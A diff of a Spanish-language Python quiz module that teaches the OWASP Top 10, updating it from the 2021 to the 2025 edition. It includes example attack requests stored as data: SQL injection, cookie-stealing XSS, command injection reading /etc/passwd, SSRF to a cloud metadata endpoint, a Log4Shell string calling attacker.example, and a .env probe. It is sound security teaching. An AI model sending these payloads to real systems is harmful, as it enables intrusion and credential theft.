@@ -4,7 +4,7 @@ OWASP TOP 10 - Práctica de seguridad en aplicaciones web
 ========================================================
 A diferencia del resto del juego, que trabaja la seguridad de RED (capas 2 a 4),
 este módulo trabaja la seguridad de APLICACIÓN: las diez categorías del OWASP
-Top 10 (edición 2021), que es el estándar con el que se clasifican las
+Top 10 (edición 2025), que es el estándar con el que se clasifican las
 vulnerabilidades web.
 
 Tres modos, cada uno ataca el tema desde un ángulo distinto:
@@ -44,80 +44,89 @@ PCAP_ATAQUES = FILES_DIR / "owasp_http_attacks.pcap"
 
 
 # ---------------------------------------------------------------------------
-# El OWASP Top 10 (edición 2021): nombre y definición de cada categoría
+# El OWASP Top 10 (edición 2025): nombre y definición de cada categoría
 # ---------------------------------------------------------------------------
+# Respecto a 2021: SSRF deja de ser categoría propia y entra en A01;
+# «Vulnerable and Outdated Components» se amplía a toda la cadena de suministro
+# (A03); A10 es nueva; A07 y A09 cambian de nombre, y el resto cambia de puesto.
 
 TOP10 = {
     "A01": ("Broken Access Control (Control de acceso roto)",
             "El servidor no comprueba bien QUÉ puede hacer o ver cada usuario. "
             "Alguien autenticado (o ni eso) llega a datos o acciones que no le "
             "tocan: ver la factura de otro cambiando un id en la URL (IDOR), "
-            "entrar a /admin sin ser admin, o escaparse de la carpeta permitida "
-            "con ../../ (path traversal)."),
-    "A02": ("Cryptographic Failures (Fallos criptográficos)",
+            "entrar a /admin sin ser admin, escaparse de la carpeta permitida "
+            "con ../../ (path traversal) o hacer que el propio servidor pida "
+            "una URL interna en su nombre (SSRF, que en 2025 entra aquí)."),
+    "A02": ("Security Misconfiguration (Configuración insegura)",
+            "El software está bien, pero mal configurado: cuentas o contraseñas "
+            "por defecto, mensajes de error que enseñan la traza y las rutas "
+            "internas, paneles de administración abiertos, listado de "
+            "directorios activado, almacenamiento en la nube abierto a "
+            "cualquiera, cabeceras de seguridad ausentes, servicios "
+            "innecesarios encendidos."),
+    "A03": ("Software Supply Chain Failures (Fallos en la cadena de "
+            "suministro del software)",
+            "El fallo llega a través de lo que NO escribiste tú: librerías, "
+            "frameworks, herramientas de compilación o actualizaciones de "
+            "terceros. Puede ser una dependencia con una vulnerabilidad "
+            "pública (CVE) sin parchear, como Log4Shell o Struts, o un "
+            "proveedor comprometido que distribuye código malicioso, como "
+            "SolarWinds. En 2021 era «Vulnerable and Outdated Components»."),
+    "A04": ("Cryptographic Failures (Fallos criptográficos)",
             "Datos sensibles que viajan o se guardan sin la protección debida: "
             "contraseñas o tarjetas por HTTP sin TLS, cifrado débil o roto "
             "(MD5, DES), claves quemadas en el código, contraseñas guardadas en "
             "claro o con un hash sin sal. Antes se llamaba «Exposición de datos "
             "sensibles»."),
-    "A03": ("Injection (Inyección)",
+    "A05": ("Injection (Inyección)",
             "Entrada del usuario que el programa mete sin filtrar dentro de otra "
             "cosa que luego se interpreta: una consulta SQL (SQL injection), un "
             "comando del sistema (command injection), HTML/JavaScript que acaba "
             "en el navegador de otra víctima (XSS), LDAP, etc. El atacante "
             "escribe datos que el sistema confunde con instrucciones."),
-    "A04": ("Insecure Design (Diseño inseguro)",
+    "A06": ("Insecure Design (Diseño inseguro)",
             "El fallo no está en un bug concreto sino en cómo se pensó la "
             "funcionalidad: falta un límite de intentos, el «recuperar "
             "contraseña» se puede abusar, se confía en que el cliente valide, no "
             "hubo modelado de amenazas. Aunque esté bien programado, el diseño "
             "en sí permite el abuso."),
-    "A05": ("Security Misconfiguration (Configuración insegura)",
-            "El software está bien, pero mal configurado: cuentas o contraseñas "
-            "por defecto, mensajes de error que enseñan la traza y las rutas "
-            "internas, paneles de administración abiertos, listado de "
-            "directorios activado, cabeceras de seguridad ausentes, servicios "
-            "innecesarios encendidos."),
-    "A06": ("Vulnerable and Outdated Components (Componentes vulnerables y "
-            "desactualizados)",
-            "Se usa una librería, framework o servidor con una vulnerabilidad "
-            "pública conocida (tiene su CVE) y no se ha parcheado. El atacante "
-            "no inventa nada: aprovecha un agujero ya documentado. Log4Shell y "
-            "la brecha de Equifax (Apache Struts) son los ejemplos de manual."),
-    "A07": ("Identification and Authentication Failures (Fallos de "
-            "identificación y autenticación)",
+    "A07": ("Authentication Failures (Fallos de autenticación)",
             "El mecanismo que comprueba QUIÉN eres falla: se permiten "
             "contraseñas débiles o filtradas, no hay freno a la fuerza bruta "
             "(credential stuffing), las sesiones no caducan o el id de sesión es "
-            "predecible, no hay segundo factor. Antes se llamaba «Broken "
-            "Authentication»."),
-    "A08": ("Software and Data Integrity Failures (Fallos de integridad de "
-            "software y datos)",
-            "Se confía en código o datos cuya procedencia no se verifica: una "
-            "actualización automática sin firmar, una dependencia del repositorio "
-            "que fue manipulada (ataque a la cadena de suministro, estilo "
-            "SolarWinds), o deserializar objetos que llegan del usuario sin "
-            "comprobarlos."),
-    "A09": ("Security Logging and Monitoring Failures (Fallos de registro y "
-            "monitorización)",
-            "No se registra lo que importa, o nadie mira los registros, así que "
-            "un ataque pasa inadvertido durante semanas o meses. Sin logs de "
-            "inicios de sesión fallidos ni alertas, la brecha se descubre tarde "
-            "y es imposible reconstruir qué pasó."),
-    "A10": ("Server-Side Request Forgery - SSRF (Falsificación de petición del "
-            "lado del servidor)",
-            "Se engaña al servidor para que ÉL haga una petición a una URL que "
-            "elige el atacante. Como la petición sale desde dentro, llega a "
-            "sitios que el atacante no alcanza: servicios internos o el endpoint "
-            "de metadatos de la nube (169.254.169.254), de donde se roban "
-            "credenciales temporales."),
+            "predecible, no hay segundo factor. En 2021 se llamaba "
+            "«Identification and Authentication Failures»."),
+    "A08": ("Software or Data Integrity Failures (Fallos de integridad del "
+            "software o de los datos)",
+            "Se usa código o datos sin verificar que no los han manipulado: "
+            "instalar una actualización o un firmware que no va firmado, "
+            "bajar un paquete de una web cualquiera en vez del repositorio "
+            "oficial, o deserializar objetos que llegan del usuario sin "
+            "comprobarlos. Es el control de integridad de cada pieza concreta."),
+    "A09": ("Security Logging and Alerting Failures (Fallos de registro y "
+            "alertas)",
+            "No se registra lo que importa, o se registra pero nada salta "
+            "cuando pasa algo raro, así que un ataque pasa inadvertido durante "
+            "semanas o meses. Sin logs de inicios de sesión fallidos ni "
+            "alertas, la brecha se descubre tarde y es imposible reconstruir "
+            "qué pasó. En 2021 se llamaba «Security Logging and Monitoring "
+            "Failures»."),
+    "A10": ("Mishandling of Exceptional Conditions (Mala gestión de "
+            "condiciones excepcionales)",
+            "La aplicación no prevé, no detecta o gestiona mal lo que se sale "
+            "de lo normal: una excepción, un parámetro que falta, un servicio "
+            "que no responde, la memoria o el disco llenos. Lo típico es "
+            "«fallar abierto» (si la comprobación da error, se deja pasar), "
+            "dejar una transacción a medias sin deshacerla o no liberar los "
+            "recursos tras un fallo. Categoría nueva en 2025."),
 }
 
 ORDEN = list(TOP10)
 
 
 def nombre_corto(cid: str) -> str:
-    """'A03' -> 'A03 Injection (Inyección)' pero sin la coletilla larga."""
+    """'A05' -> 'A05 Injection (Inyección)' pero sin la coletilla larga."""
     return f"{cid} {TOP10[cid][0]}"
 
 
@@ -130,7 +139,7 @@ def nombre_corto(cid: str) -> str:
 # leerlo de vuelta, el paquete i corresponde al ataque i sin ambigüedad.
 
 ATAQUES_HTTP = [
-    dict(cid="A03",
+    dict(cid="A05",
          req=("GET /producto.php?id=1' OR '1'='1 HTTP/1.1\r\n"
               "Host: tienda.example\r\n"
               "User-Agent: Mozilla/5.0\r\n"
@@ -140,7 +149,7 @@ ATAQUES_HTTP = [
               "deja siempre verdadera. Es una SQL injection de manual: entrada "
               "del usuario que el servidor concatena dentro de una consulta sin "
               "separar datos de instrucciones."),
-    dict(cid="A03",
+    dict(cid="A05",
          req=("GET /buscar?q=<script>alert(document.cookie)</script> HTTP/1.1\r\n"
               "Host: foro.example\r\n"
               "User-Agent: Mozilla/5.0\r\n\r\n"),
@@ -149,7 +158,7 @@ ATAQUES_HTTP = [
               "<script> se ejecuta en el navegador de quien abra el enlace. Es "
               "Cross-Site Scripting (XSS), una forma de inyección: el atacante "
               "inyecta JavaScript en el HTML de la víctima."),
-    dict(cid="A03",
+    dict(cid="A05",
          req=("GET /herramientas/ping?host=8.8.8.8;cat+/etc/passwd HTTP/1.1\r\n"
               "Host: panel.example\r\n"
               "User-Agent: curl/8.4.0\r\n\r\n"),
@@ -177,7 +186,7 @@ ATAQUES_HTTP = [
               "cliente. Si el servidor la entrega sin comprobar de quién es, es "
               "un IDOR (Insecure Direct Object Reference): Broken Access Control "
               "clásico, cambiar un número en la URL para ver datos ajenos."),
-    dict(cid="A10",
+    dict(cid="A01",
          req=("POST /api/preview HTTP/1.1\r\n"
               "Host: app.example\r\n"
               "Content-Type: application/json\r\n"
@@ -187,8 +196,10 @@ ATAQUES_HTTP = [
          expl="169.254.169.254 es el endpoint de metadatos de las nubes (AWS, "
               "GCP, Azure), solo alcanzable DESDE la propia instancia. Se engaña "
               "al servidor para que lo consulte y devuelva las credenciales "
-              "temporales del rol. Es SSRF (Server-Side Request Forgery)."),
-    dict(cid="A06",
+              "temporales del rol. Es SSRF (Server-Side Request Forgery), que en "
+              "2025 deja de ser categoría propia y entra en Broken Access "
+              "Control: el servidor accede a un recurso que no debería."),
+    dict(cid="A03",
          req=("GET / HTTP/1.1\r\n"
               "Host: web.example\r\n"
               "User-Agent: ${jndi:ldap://attacker.example/exploit}\r\n"
@@ -197,9 +208,10 @@ ATAQUES_HTTP = [
          expl="Esa cadena ${jndi:ldap://...} dispara Log4Shell (CVE-2021-44228), "
               "el fallo de la librería de logs Log4j: al registrar la cabecera, "
               "la librería resuelve el JNDI y ejecuta código remoto. Aprovechar "
-              "una vulnerabilidad conocida de una librería sin parchear es "
-              "Vulnerable and Outdated Components."),
-    dict(cid="A05",
+              "una vulnerabilidad conocida de una dependencia sin parchear es "
+              "Software Supply Chain Failures (en 2021, Vulnerable and Outdated "
+              "Components)."),
+    dict(cid="A02",
          req=("GET /.env HTTP/1.1\r\n"
               "Host: startup.example\r\n"
               "User-Agent: python-requests/2.31\r\n\r\n"),
@@ -218,8 +230,8 @@ ATAQUES_HTTP = [
          expl="Un POST aislado parece normal, pero es uno de cientos contra "
               "/login probando usuario admin con contraseñas comunes. Sin freno "
               "a los intentos, es fuerza bruta / credential stuffing: "
-              "Identification and Authentication Failures."),
-    dict(cid="A02",
+              "Authentication Failures."),
+    dict(cid="A04",
          req=("POST /login HTTP/1.1\r\n"
               "Host: hospital.example\r\n"
               "Content-Type: application/x-www-form-urlencoded\r\n"
@@ -311,93 +323,100 @@ CASOS = [
      "Ocultar el enlace en el menú no es control de acceso. El servidor debe "
      "rechazar a quien no sea admin aunque teclee la URL. Acceder a una función "
      "para la que no se tiene permiso es Broken Access Control."),
-    ("A02",
+    ("A04",
      "Tras robar la base de datos de una tienda, los atacantes publican las "
      "contraseñas de todos los clientes. Resultó que estaban guardadas tal cual "
      "escritas, sin ningún tipo de hash ni cifrado.",
      "El problema es cómo se protegían (o no) los datos sensibles. Guardar "
      "contraseñas en texto plano es un Cryptographic Failure."),
-    ("A02",
+    ("A04",
      "En una cafetería, alguien con el portátil captura el wifi y ve pasar el "
      "usuario y la contraseña de quienes entran al portal de empleados de una "
      "cadena, porque el formulario envía los datos por http:// y no https://.",
      "Las credenciales viajan sin cifrar y se pueden leer del tráfico. Datos "
      "sensibles sin TLS en tránsito son un Cryptographic Failure."),
-    ("A03",
+    ("A05",
      "Un buscador de una web muestra «No hay resultados para: TEXTO», donde "
      "TEXTO es lo que escribió el usuario. Alguien busca un fragmento de "
      "JavaScript y comprueba que el navegador lo ejecuta. Reparte un enlace "
      "preparado y roba las sesiones de quienes lo abren.",
      "La entrada del usuario acaba ejecutándose como código en el navegador de "
      "las víctimas: es XSS, dentro de la categoría Injection."),
-    ("A03",
+    ("A05",
      "En un formulario de acceso, escribir en el campo usuario el texto "
      "admin'-- permite entrar sin contraseña, porque el texto altera la "
      "consulta que valida las credenciales contra la base de datos.",
      "La entrada se mezcla con la consulta SQL y cambia su lógica. Es SQL "
      "injection, de la categoría Injection."),
-    ("A04",
+    ("A06",
      "Una web permite pedir cita médica. No hay ningún límite: un script puede "
      "reservar las 500 citas del día en segundos y dejar la agenda inservible. "
      "El código funciona perfecto; simplemente nunca se pensó en abusos así.",
      "No es un bug de implementación ni una mala config: la funcionalidad se "
      "diseñó sin defensas contra el abuso (faltan límites, no hubo modelado de "
      "amenazas). Eso es Insecure Design."),
-    ("A04",
+    ("A06",
      "El «¿olvidó su contraseña?» de un banco pide solo la fecha de nacimiento "
      "para dejar cambiarla. Como ese dato es fácil de averiguar, cualquiera "
      "puede tomar la cuenta de otro. El flujo hace justo lo que se diseñó.",
      "El mecanismo de recuperación es inseguro por diseño: el propio flujo, "
      "aun bien programado, permite el secuestro. Es Insecure Design."),
-    ("A05",
-     "Al provocar un error en una web, en vez de una página amable aparece la "
-     "traza completa de la excepción: rutas del servidor, versión del framework "
-     "y hasta la cadena de conexión a la base de datos.",
-     "El software no está roto, está mal configurado: dejar los errores "
-     "detallados en producción filtra información interna. Es Security "
-     "Misconfiguration."),
-    ("A05",
+    ("A02",
+     "Una clínica guarda los escaneos de sus pacientes en un bucket de "
+     "almacenamiento en la nube. Al crearlo dejaron el permiso «público», y "
+     "cualquiera que conozca o adivine la dirección puede listar y descargar "
+     "miles de informes médicos.",
+     "No hay bug en ningún programa: el servicio funciona como se configuró, "
+     "y se configuró abierto a todo Internet. Es Security Misconfiguration."),
+    ("A02",
      "Un equipo despliega un panel de base de datos y lo deja con el usuario y "
      "la contraseña que trae de fábrica (admin/admin), accesible desde "
      "Internet. Alguien entra sin esfuerzo con esas credenciales por defecto.",
      "Credenciales por defecto sin cambiar y un servicio expuesto que no "
      "debería estarlo: Security Misconfiguration."),
-    ("A06",
+    ("A03",
      "Una empresa sufre una intrusión total. La causa: usaban una versión "
      "antigua de un framework con una vulnerabilidad pública (tenía su CVE y su "
      "parche desde hacía meses) que nunca actualizaron. (Es el patrón de la "
      "brecha de Equifax con Apache Struts.)",
-     "El agujero ya estaba documentado y parcheado; el fallo fue no actualizar. "
-     "Es Vulnerable and Outdated Components."),
-    ("A06",
+     "El agujero ya estaba documentado y parcheado; el fallo fue no actualizar "
+     "una dependencia. Es Software Supply Chain Failures (en 2021 se llamaba "
+     "Vulnerable and Outdated Components)."),
+    ("A03",
      "En diciembre de 2021 medio Internet corre a parchear por una cadena "
      "${jndi:ldap://...} que, al ser registrada por la librería de logs Log4j, "
      "ejecuta código remoto. Las apps afectadas solo tenían esa dependencia "
      "sin actualizar.",
      "Log4Shell: una librería ampliamente usada con un fallo crítico conocido. "
-     "Sufrirlo por no haberla actualizado es Vulnerable and Outdated "
-     "Components."),
+     "Sufrirlo por no haberla actualizado es Software Supply Chain Failures."),
     ("A07",
      "Un servicio de streaming nota accesos raros: los atacantes probaron, "
      "contra su login, millones de pares usuario/contraseña filtrados de OTRA "
      "web. Como mucha gente reutiliza claves y no había segundo factor ni "
      "límite de intentos, entraron en miles de cuentas.",
      "Fallan los controles de autenticación: sin freno a los intentos ni 2FA, "
-     "el credential stuffing funciona. Es Identification and Authentication "
-     "Failures."),
+     "el credential stuffing funciona. Es Authentication Failures."),
     ("A07",
      "Una web genera los identificadores de sesión de forma predecible "
      "(sesión1001, sesión1002...). Un atacante prueba números cercanos al suyo "
      "en la cookie y se cuela en la sesión ya iniciada de otros usuarios.",
      "El manejo de la sesión es débil: un id de sesión adivinable deja "
-     "suplantar a otros. Es Identification and Authentication Failures."),
-    ("A08",
+     "suplantar a otros. Es Authentication Failures."),
+    ("A03",
      "Una herramienta de monitorización muy usada recibe una actualización "
      "automática firmada con la infraestructura del fabricante... que los "
      "atacantes habían comprometido. Miles de clientes instalan la puerta "
      "trasera creyendo que es una actualización legítima. (Estilo SolarWinds.)",
-     "Se confió en una actualización cuya integridad estaba comprometida en "
-     "origen: un ataque a la cadena de suministro. Es Software and Data "
+     "El código malicioso entró por un proveedor de confianza, al fabricar y "
+     "distribuir su propio software: un ataque a la cadena de suministro. Es "
+     "Software Supply Chain Failures."),
+    ("A08",
+     "Un modelo de router doméstico instala las actualizaciones de firmware sin "
+     "comprobar ninguna firma. Un atacante en la misma red sirve un firmware "
+     "modificado haciéndose pasar por el servidor del fabricante, y el router "
+     "lo acepta y lo instala.",
+     "El fabricante no está comprometido: lo que falla es que el dispositivo no "
+     "verifica que la pieza que instala sea la auténtica. Es Software or Data "
      "Integrity Failures."),
     ("A08",
      "Una app guarda el estado del carrito como un objeto serializado en una "
@@ -405,34 +424,50 @@ CASOS = [
      "modifica ese objeto a mano y, al deserializarlo el servidor sin "
      "comprobar nada, consigue ejecutar código.",
      "Se deserializan datos que vienen del usuario sin verificar su integridad. "
-     "Es Software and Data Integrity Failures."),
+     "Es Software or Data Integrity Failures."),
     ("A09",
      "Una empresa se entera por un periodista de que lleva ocho meses con los "
      "atacantes dentro robando datos. No tenían alertas ni revisaban los "
      "registros de acceso; de hecho, de varios sistemas ni siquiera guardaban "
      "logs, así que no pueden reconstruir qué se llevaron.",
-     "El ataque pasó inadvertido por falta de registro y vigilancia. Es "
-     "Security Logging and Monitoring Failures."),
+     "El ataque pasó inadvertido por falta de registro y de alertas. Es "
+     "Security Logging and Alerting Failures."),
     ("A09",
      "El equipo de seguridad investiga un incidente, pero los inicios de sesión "
      "fallidos no se guardaban en ningún sitio y los pocos logs que había se "
      "sobrescribían cada día. Imposible saber cuándo ni cómo empezó todo.",
      "Sin logs útiles ni retención, detectar y analizar la brecha es "
-     "imposible. Es Security Logging and Monitoring Failures."),
-    ("A10",
+     "imposible. Es Security Logging and Alerting Failures."),
+    ("A01",
      "Una web deja subir una foto de perfil «desde una URL». Un atacante, en "
      "vez de una imagen, pone http://169.254.169.254/latest/meta-data/ y el "
      "servidor, alojado en la nube, le devuelve las credenciales temporales de "
      "su propio rol.",
      "Se abusa del servidor para que haga una petición a un destino interno que "
      "el atacante no alcanza directamente. Es SSRF (Server-Side Request "
-     "Forgery)."),
-    ("A10",
+     "Forgery), que en 2025 forma parte de Broken Access Control."),
+    ("A01",
      "Un conversor de páginas a PDF acepta cualquier URL. Alguien le pasa "
      "http://localhost:8080/admin, una consola interna que solo responde a "
      "peticiones del propio servidor, y obtiene su contenido en el PDF.",
      "El servidor hace de puente hacia un servicio interno no expuesto: es "
-     "SSRF."),
+     "SSRF, dentro de Broken Access Control."),
+    ("A10",
+     "Antes de aprobar cada compra, una tienda consulta un servicio antifraude. "
+     "Si ese servicio tarda demasiado, el código captura la excepción y, por no "
+     "bloquear la venta, la aprueba igual. Unos estafadores lo descubren: "
+     "saturan el antifraude y todas sus compras con tarjetas robadas pasan.",
+     "Ante un error, la aplicación «falla abierta»: cuando no sabe qué hacer, "
+     "deja pasar. Es Mishandling of Exceptional Conditions; lo seguro es "
+     "fallar cerrado y rechazar si la comprobación no se pudo hacer."),
+    ("A10",
+     "Una app bancaria hace las transferencias en dos pasos: resta del origen y "
+     "suma en el destino. Un atacante corta la conexión justo entre los dos "
+     "pasos y reintenta; como el sistema no deshace la operación a medias, "
+     "consigue que el destino cobre dos veces.",
+     "La transacción quedó en un estado incoherente porque el fallo a mitad no "
+     "se gestionó (no hubo rollback). Es Mishandling of Exceptional "
+     "Conditions."),
 ]
 
 
@@ -610,7 +645,7 @@ def _resultado(aciertos: int, total: int) -> None:
 
 def imprimir_top10() -> None:
     print("\n" + RULE)
-    print("  OWASP TOP 10 (2021)")
+    print("  OWASP TOP 10 (2025)")
     print(RULE)
     for cid in ORDEN:
         nombre, definicion = TOP10[cid]
